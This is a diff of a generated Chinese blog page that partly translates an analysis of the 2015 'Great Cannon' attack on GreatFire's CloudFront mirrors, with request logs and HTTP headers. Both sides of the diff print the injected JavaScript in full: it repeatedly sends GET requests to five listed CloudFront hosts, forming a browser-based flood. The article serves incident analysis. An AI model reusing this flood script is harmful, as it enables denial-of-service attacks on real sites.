@@ -13,23 +13,25 @@
     
     <meta name="description" content="听说在GFW之外我们又有一个大杀器GreatCannon， 好奇之下找了一篇文章翻翻，顺便部分翻译了一下。
 　　看完之后的感受是，所谓GreatCannon不过是利用了独有的资源，并没啥高精尖的东西，不过，了解人家分析日志的追踪攻击的过程还挺有意思，当作一次了解运维和安全的机会吧。
-利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一组在">
+利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一">
 <meta property="og:type" content="article">
 <meta property="og:title" content="The Great Cannon">
 <meta property="og:url" content="http://azyet.github.io/2015/05/22/theGreatCannon/index.html">
 <meta property="og:site_name" content="AzYet's Notebook">
 <meta property="og:description" content="听说在GFW之外我们又有一个大杀器GreatCannon， 好奇之下找了一篇文章翻翻，顺便部分翻译了一下。
 　　看完之后的感受是，所谓GreatCannon不过是利用了独有的资源，并没啥高精尖的东西，不过，了解人家分析日志的追踪攻击的过程还挺有意思，当作一次了解运维和安全的机会吧。
-利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一组在">
+利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/55f247cbgw1esdcrz9ffej20hx09lwgv.jpg">
 <meta property="og:image" content="http://ww3.sinaimg.cn/large/55f247cbgw1esdcr1223pj20ca08yacm.jpg">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/55f247cbjw1esddhk4w26j20j10guwgv.jpg">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/55f247cbjw1esdeerga2sj20mm0engpl.jpg">
+<meta property="og:updated_time" content="2015-12-03T22:21:06.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The Great Cannon">
 <meta name="twitter:description" content="听说在GFW之外我们又有一个大杀器GreatCannon， 好奇之下找了一篇文章翻翻，顺便部分翻译了一下。
 　　看完之后的感受是，所谓GreatCannon不过是利用了独有的资源，并没啥高精尖的东西，不过，了解人家分析日志的追踪攻击的过程还挺有意思，当作一次了解运维和安全的机会吧。
-利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一组在">
+利用百度来操纵百万级电脑发起DDoS　　通过在诸如Amazon的Clound Front这样的大型CDN上部署一">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/55f247cbgw1esdcrz9ffej20hx09lwgv.jpg">
 <link rel="publisher" href="107081205815475258476">
 
     
@@ -42,7 +44,7 @@
     <link rel="apple-touch-icon" href="/img/avatar_bear.jpg">
     <link rel="apple-touch-icon-precomposed" href="/img/avatar_bear.jpg">
     
-    <link rel="stylesheet" href="/css/style.css" type="text/css">
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
   <body>
@@ -125,7 +127,7 @@
 窜改发生在来自中国以外的流量访问百度服务器时
 </code></pre><a id="more"></a>
 <h2 id="不只是一次普通的攻击">不只是一次普通的攻击</h2><p>　　18日查看攻击网站的日志，GreatFire在Amazon设施上运行若干镜像站，日志数量很大，我们决定在前一小时内查看“d19r410x06nzy6.cloudfront.net”的日志。</p>
-<p>　　调查试图从500个日志，1亿请求中查找线索，以下是一个请求的样本：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2015</span>-<span class="number">03</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">52</span>:<span class="number">13</span> JFK1 <span class="number">66.65</span>.x.x</span><br><span class="line">GET /?1425369133</span><br><span class="line">http:<span class="comment">//pos.baidu.com/wh/o.htm?ltr=https://www.google.com/&amp;cf=u</span></span><br><span class="line">Mozilla<span class="regexp">/5.0 (Linux; Android 4.4.4; SM-N910V Build/</span>KTU84P) AppleWebKit<span class="regexp">/537.36 (KHTML, like Gecko) Chrome/</span><span class="number">40.0</span>.2214.109 </span><br><span class="line"><span class="number">2015</span>-<span class="number">03</span>-<span class="number">18</span> <span class="number">11</span>:<span class="number">52</span>:<span class="number">13</span> JFK1 <span class="number">71.175</span>.x.x</span><br><span class="line">GET /?1425369133</span><br><span class="line">http:<span class="comment">//www.17k.com/chapter/471287/1 7884999.html</span></span><br><span class="line">Mozilla<span class="regexp">/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">4</span></span><br></pre></td></tr></table></figure></p>
+<p>　　调查试图从500个日志，1亿请求中查找线索，以下是一个请求的样本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2015-03-18 11:52:13 JFK1 66.65.x.x</div><div class="line">GET /?1425369133</div><div class="line">http://pos.baidu.com/wh/o.htm?ltr=https://www.google.com/&amp;cf=u</div><div class="line">Mozilla/5.0 (Linux; Android 4.4.4; SM-N910V Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 </div><div class="line">2015-03-18 11:52:13 JFK1 71.175.x.x</div><div class="line">GET /?1425369133</div><div class="line">http://www.17k.com/chapter/471287/1 7884999.html</div><div class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/4</div></pre></td></tr></table></figure></p>
 <p>　　第一个请求告诉我们18日，一台IP为66.65.x.x的电脑发送了一个Get请求(?1425369133)内容，它由一个在百度中探索google的请求中重定向而来。这个请求被amazon的NY服务器路由进入中国。</p>
 <p>　　日志显示攻击是由分布在全球的电脑发起的，用海量的<code>GET /?142xxxxxxx</code>请求洪泛服务器。</p>
 <p>　　超1千万散布全球的台电脑发送了位于CloundFront的CreatFire服务器，每台电脑只发送了相对较小数量的请求，每小时约1-50个。</p>
@@ -142,20 +144,20 @@
 <p>　　我们搜索了“Urlquery.net”，期望它保存了恶意代码，然后我们发现了一份似乎支持我们的假设的有趣的报告。接近百度服务器的“某事物”在用户访问各种网站时向其发送了恶意攻击代码。<br>    <a href="http://urlquery.net/report.php?id=1426672633782" target="_blank" rel="external">http://urlquery.net/report.php?id=1426672633782</a></p>
 <p><img src="http://ww4.sinaimg.cn/large/55f247cbjw1esddhk4w26j20j10guwgv.jpg" alt=""></p>
 <p>　　报告显示，访问<a href="http://zhao.juji123.com时，触发了指向位于cloundFront中站点的请求：" target="_blank" rel="external">http://zhao.juji123.com时，触发了指向位于cloundFront中站点的请求：</a></p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="regexp">/?1425380211HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> d14qqseh1jha6e.cloudfront.net</span><br><span class="line">User-<span class="string">Agent:</span> Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>; .NET C</span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/plain, */</span>*; q=<span class="number">0.01</span></span><br><span class="line">Accept-<span class="string">Language:</span> en-us,en;q=<span class="number">0.5</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip,deflate</span><br><span class="line">Accept-<span class="string">Charset:</span> ISO-<span class="number">8859</span>-<span class="number">1</span>,utf-<span class="number">8</span>;q=<span class="number">0.7</span>,*;q=<span class="number">0.7</span></span><br><span class="line">Keep-<span class="string">Alive:</span> <span class="number">115</span></span><br><span class="line"><span class="string">Connection:</span> keep-alive</span><br><span class="line"><span class="string">Referer:</span> <span class="string">http:</span><span class="comment">//pos.baidu.com/wh/o.htm?ltr=&amp;amp;cf=u</span></span><br><span class="line"><span class="string">Origin:</span> <span class="string">http:</span><span class="comment">//pos.baidu.com</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">GET /?1425380211HTTP/1.1</div><div class="line">Host: d14qqseh1jha6e.cloudfront.net</div><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET C</div><div class="line">Accept: text/plain, */*; q=0.01</div><div class="line">Accept-Language: en-us,en;q=0.5</div><div class="line">Accept-Encoding: gzip,deflate</div><div class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7</div><div class="line">Keep-Alive: 115</div><div class="line">Connection: keep-alive</div><div class="line">Referer: http://pos.baidu.com/wh/o.htm?ltr=&amp;amp;cf=u</div><div class="line">Origin: http://pos.baidu.com</div></pre></td></tr></table></figure>
 <p>　　接下来我我们尝试了连接<a href="http://pos.baidu.comand" target="_blank" rel="external">http://pos.baidu.comand</a> <a href="http://dup.baidustatic.com的一轮测试，依然没有结果。" target="_blank" rel="external">http://dup.baidustatic.com的一轮测试，依然没有结果。</a></p>
 <p>　　我们联系了urlQuery.net，他们查看了一些关于百度服务器的出访cloudfront中网站的报告。在一些随机的响应中有一个非常与众不同的响应。</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">Content-<span class="string">Type:</span>text/javascript</span><br><span class="line"><span class="string">Server:</span> Apache</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">1325</span></span><br><span class="line"><span class="string">Connection:</span> keep-alive</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HTTP/1.0 200 OK</div><div class="line">Content-Type:text/javascript</div><div class="line">Server: Apache</div><div class="line">Content-Length: 1325</div><div class="line">Connection: keep-alive</div></pre></td></tr></table></figure>
 <p>　　一些响应像来来自幽灵Aapche服务器。</p>
 <p>　　以123.125.65.120的ip访问百度服务器和以下域名dup.baidustatic.com, ecomcbjs.jomodns.com and cbjs.e.shifen.com确实有时会返回预期之外的响应。</p>
 <p>　　同样的行为也会在以hm.baidu.com and hm.e.shifen.com域名访问61.135.185.140时出现。</p>
 <p>　　幸运的是，urlQurty保存了这些恶意代码。</p>
 <h2 id="注入代码">注入代码</h2><p>　　触发攻击的Javascript代码很可能是由位于中国基础设施中的透明代理在合法流量连接百度服务器时注入的，恶意代码在h.js中。</p>
-<h2 id="百度分析代码被用来攻击">百度分析代码被用来攻击</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'&gt;&lt;\/script&gt;"</span>); </span><br><span class="line">!<span class="built_in">window</span>.jQuery &amp;&amp; <span class="built_in">document</span>.write(<span class="string">"&lt;script src='http://code.jquery.com/jquery-latest.js'&gt;&lt;\/script&gt;"</span>); </span><br><span class="line">startime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(); </span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unixtime</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(); </span><br><span class="line">    <span class="keyword">var</span> ux = <span class="built_in">Date</span>.UTC(dt.getFullYear(), dt.getMonth(), dt.getDay(), dt.getHours(), dt.getMinutes(), dt.getSeconds()) / <span class="number">1000</span>; </span><br><span class="line">    <span class="keyword">return</span> ux; </span><br><span class="line">&#125; </span><br><span class="line">url_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"https://d117ucqx7my6vj.cloudfront.net"</span>, <span class="string">"https://d14qqseh1jha6e.cloudfront.net"</span>, </span><br><span class="line">        <span class="string">"https://d18yee9du95yb4.cloudfront.net"</span>, <span class="string">"https://d19r410x06nzy6.cloudfront.net"</span>, <span class="string">"https://d1blw6ybvy6vm2.cloudfront.net"</span>) </span><br><span class="line">NUM = url_array.length; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r_send2</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> x = unixtime() % NUM; </span><br><span class="line">    <span class="keyword">var</span> url = url_array[x]; </span><br><span class="line">    get(url); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">(myurl)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> ping; </span><br><span class="line">    $.ajax(&#123; </span><br><span class="line">url: myurl + <span class="string">"?"</span> + unixtime(), </span><br><span class="line">dataType: <span class="string">"text"</span>, </span><br><span class="line">timeout: <span class="number">10000</span>, </span><br><span class="line">cache: <span class="literal">true</span>, </span><br><span class="line">beforeSend: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; </span><br><span class="line">requestTime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(); </span><br><span class="line">&#125;, </span><br><span class="line">complete: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; </span><br><span class="line">responseTime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(); </span><br><span class="line">ping = <span class="built_in">Math</span>.floor(responseTime - requestTime); </span><br><span class="line"><span class="keyword">if</span> (responseTime - startime &lt; <span class="number">300000</span>) &#123; </span><br><span class="line">    r_send(ping); </span><br><span class="line">    count = count + <span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r_send</span><span class="params">(ping)</span> </span>&#123; </span><br><span class="line">    setTimeout(<span class="string">"r_send2()"</span>, ping); </span><br><span class="line">&#125; </span><br><span class="line">setTimeout(<span class="string">"r_send2()"</span>, <span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="百度分析代码被用来攻击">百度分析代码被用来攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">document.write(&quot;&lt;script src=&apos;http://libs.baidu.com/jquery/2.0.0/jquery.min.js&apos;&gt;&lt;\/script&gt;&quot;); </div><div class="line">!window.jQuery &amp;&amp; document.write(&quot;&lt;script src=&apos;http://code.jquery.com/jquery-latest.js&apos;&gt;&lt;\/script&gt;&quot;); </div><div class="line">startime = new Date().getTime(); </div><div class="line">var count = 0; </div><div class="line">function unixtime() &#123; </div><div class="line">    var dt = new Date(); </div><div class="line">    var ux = Date.UTC(dt.getFullYear(), dt.getMonth(), dt.getDay(), dt.getHours(), dt.getMinutes(), dt.getSeconds()) / 1000; </div><div class="line">    return ux; </div><div class="line">&#125; </div><div class="line">url_array = new Array(&quot;https://d117ucqx7my6vj.cloudfront.net&quot;, &quot;https://d14qqseh1jha6e.cloudfront.net&quot;, </div><div class="line">        &quot;https://d18yee9du95yb4.cloudfront.net&quot;, &quot;https://d19r410x06nzy6.cloudfront.net&quot;, &quot;https://d1blw6ybvy6vm2.cloudfront.net&quot;) </div><div class="line">NUM = url_array.length; </div><div class="line">function r_send2() &#123; </div><div class="line">    var x = unixtime() % NUM; </div><div class="line">    var url = url_array[x]; </div><div class="line">    get(url); </div><div class="line">&#125; </div><div class="line">function get(myurl) &#123; </div><div class="line">    var ping; </div><div class="line">    $.ajax(&#123; </div><div class="line">url: myurl + &quot;?&quot; + unixtime(), </div><div class="line">dataType: &quot;text&quot;, </div><div class="line">timeout: 10000, </div><div class="line">cache: true, </div><div class="line">beforeSend: function() &#123; </div><div class="line">requestTime = new Date().getTime(); </div><div class="line">&#125;, </div><div class="line">complete: function() &#123; </div><div class="line">responseTime = new Date().getTime(); </div><div class="line">ping = Math.floor(responseTime - requestTime); </div><div class="line">if (responseTime - startime &lt; 300000) &#123; </div><div class="line">    r_send(ping); </div><div class="line">    count = count + 1; </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">&#125;); </div><div class="line">&#125; </div><div class="line">function r_send(ping) &#123; </div><div class="line">    setTimeout(&quot;r_send2()&quot;, ping); </div><div class="line">&#125; </div><div class="line">setTimeout(&quot;r_send2()&quot;, 2000);</div></pre></td></tr></table></figure>
 <p>　　代码中包含一些与众不同的指纹确认就是这段代码触发了大规模攻击。</p>
-<h3 id="时间戳">时间戳</h3><p>　　时间戳是unixtime()生成的，代码作者犯了一个错误，他误用了getDay()当作getDate()来获取月份中的日期。3月18日GetDay()会返回3,因为是星期三，这就解释了为何我们收到的时间戳会有15天的偏移，这个Bug告诉我们找对了代码！<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> unixtime<span class="literal">()</span> &#123; </span><br><span class="line"> var dt = <span class="keyword">new</span> <span class="type">Date</span><span class="literal">()</span>; </span><br><span class="line"> var ux = <span class="type">Date</span>.<span class="type">UTC</span>(dt.getFullYear<span class="literal">()</span>, dt.getMonth<span class="literal">()</span>, dt.getDay<span class="literal">()</span>, dt.getHours<span class="literal">()</span>, dt.getMinutes<span class="literal">()</span>, dt.getSeconds<span class="literal">()</span>) / <span class="number">1000</span>; </span><br><span class="line"> return ux; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="时间戳">时间戳</h3><p>　　时间戳是unixtime()生成的，代码作者犯了一个错误，他误用了getDay()当作getDate()来获取月份中的日期。3月18日GetDay()会返回3,因为是星期三，这就解释了为何我们收到的时间戳会有15天的偏移，这个Bug告诉我们找对了代码！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function unixtime() &#123; </div><div class="line"> var dt = new Date(); </div><div class="line"> var ux = Date.UTC(dt.getFullYear(), dt.getMonth(), dt.getDay(), dt.getHours(), dt.getMinutes(), dt.getSeconds()) / 1000; </div><div class="line"> return ux; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <h3 id="目标">目标</h3><p>　　代码中包含了一个到cloundfront的目标列表，<code>url: myurl + &quot;?&quot; + unixtime()</code> 也符合Get Flooding中的指纹。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">"https://d117ucqx7my6vj.cloudfront.net"</span>, <span class="string">"https://d14qqseh1jha6e.cloudfront.net"</span>, </span><br><span class="line"><span class="string">"https://d18yee9du95yb4.cloudfront.net"</span>, <span class="string">"https://d19r410x06nzy6.cloudfront.net"</span>, <span class="string">"https://d1blw6ybvy6vm2.cloudfront.net"</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">url_array = new Array(&quot;https://d117ucqx7my6vj.cloudfront.net&quot;, &quot;https://d14qqseh1jha6e.cloudfront.net&quot;, </div><div class="line">&quot;https://d18yee9du95yb4.cloudfront.net&quot;, &quot;https://d19r410x06nzy6.cloudfront.net&quot;, &quot;https://d1blw6ybvy6vm2.cloudfront.net&quot;)</div></pre></td></tr></table></figure>
 <h2 id="窜改发生在哪里">窜改发生在哪里</h2><p>　　我们调查了将流量路由向这些包含恶意代码的站点的自动系统，以下ASN可以访问指向百度站点的流量。</p>
 <p>　　这是一个会发送DDoS启动器的IP和URL列表：<br><img src="http://ww4.sinaimg.cn/large/55f247cbjw1esdeerga2sj20mm0engpl.jpg" alt=""></p>
   
@@ -166,7 +168,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/great-cannon/">great cannon</a><a href="/tags/安全/">安全</a><a href="/tags/网络/">网络</a>
+  <span></span> <a href="/tags/网络/">网络</a><a href="/tags/great-cannon/">great cannon</a><a href="/tags/安全/">安全</a>
   </div>
 
 </div>
@@ -235,7 +237,7 @@
 		<ul class="clearfix">
 		
 			
-				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>30</sup></a></li>
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>31</sup></a></li>
 			
 		
 			
@@ -251,11 +253,11 @@
 			
 		
 			
-				<li><a href="/tags/rabbitmq/" title="rabbitmq">rabbitmq<sup>7</sup></a></li>
+				<li><a href="/tags/ZooKeeper/" title="ZooKeeper">ZooKeeper<sup>7</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/ZooKeeper/" title="ZooKeeper">ZooKeeper<sup>7</sup></a></li>
+				<li><a href="/tags/rabbitmq/" title="rabbitmq">rabbitmq<sup>7</sup></a></li>
 			
 		
 			
@@ -279,11 +281,11 @@
 			
 		
 			
-				<li><a href="/tags/android/" title="android">android<sup>5</sup></a></li>
+				<li><a href="/tags/操作系统/" title="操作系统">操作系统<sup>5</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/scala/" title="scala">scala<sup>4</sup></a></li>
+				<li><a href="/tags/android/" title="android">android<sup>5</sup></a></li>
 			
 		
 			
@@ -291,23 +293,23 @@
 			
 		
 			
+				<li><a href="/tags/scala/" title="scala">scala<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/内存虚拟化/" title="内存虚拟化">内存虚拟化<sup>4</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/网络/" title="网络">网络<sup>4</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/操作系统/" title="操作系统">操作系统<sup>4</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/openstack/" title="openstack">openstack<sup>3</sup></a></li>
+				<li><a href="/tags/adb/" title="adb">adb<sup>3</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/hindsight/" title="hindsight">hindsight<sup>3</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Win8/" title="Win8">Win8<sup>3</sup></a></li>
 			
 		
 			
@@ -394,7 +396,7 @@
 		
 
 		<p class="copyright">
-		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2016 
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2017 
 		
 		<a href="/about" target="_blank" title="PC_Chen">PC_Chen</a>
 		
